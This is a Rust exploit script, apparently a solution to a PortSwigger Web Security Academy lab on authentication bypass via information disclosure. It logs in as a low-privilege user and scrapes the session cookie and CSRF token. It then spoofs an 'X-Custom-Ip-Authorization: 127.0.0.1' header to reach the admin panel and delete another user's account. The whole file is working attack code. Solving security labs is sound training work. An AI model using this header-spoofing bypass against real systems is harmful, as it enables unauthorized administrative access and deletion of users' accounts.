/********************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 3/9/2023
*
* Lab: Authentication bypass via information disclosure
*
* Steps: 1. Fetch /login page
*        2. Extract the session and the csrf token
*        3. Login as wiener
*        4. Extract the new session
*        5. Bypass admin access using custom header
*        6. Delete carlos
*
*********************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr, predicate::Name};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0abb003303fd7bae82b4b248009700d8.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // try to GET /login page
    let get_login = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to GET /login".red()));

    println!("{} {}", "⦗1⦘ Fetching /login page..".white(), "OK".green());

    // extract the session
    let session = extract_session_cookie(get_login.headers())
        .expect(&format!("{}", "[!] Failed to extract the session".red()));

    // extract the csrf
    let csrf =
        extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract the token".red()));

    println!(
        "{} {}",
        "⦗2⦘ Getting session and csrf token..".white(),
        "OK".green()
    );

    // try to login as wiener
    let post_login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to login".red()));

    println!("{} {}", "⦗3⦘ Logging in as wiener..".white(), "OK".green());

    // extract the new session
    let new_session = extract_session_cookie(post_login.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract the new session".red()
    ));

    println!(
        "{} {}",
        "⦗4⦘ Getting a new session as wiener ..".white(),
        "OK".green()
    );
    println!(
        "{} {}",
        "⦗5⦘ Bypassing admin access using custom header..".white(),
        "OK".green()
    );

    // try to delete carlos
    // bypass the admin access using a custom header
    client
        .get(format!("{url}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={new_session}"))
        .header("X-Custom-Ip-Authorization", "127.0.0.1")
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to delete carlos from the admin panel".red()
        ));

    println!("{} {}", "⦗6⦘ Deleting carlos..".white(), "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
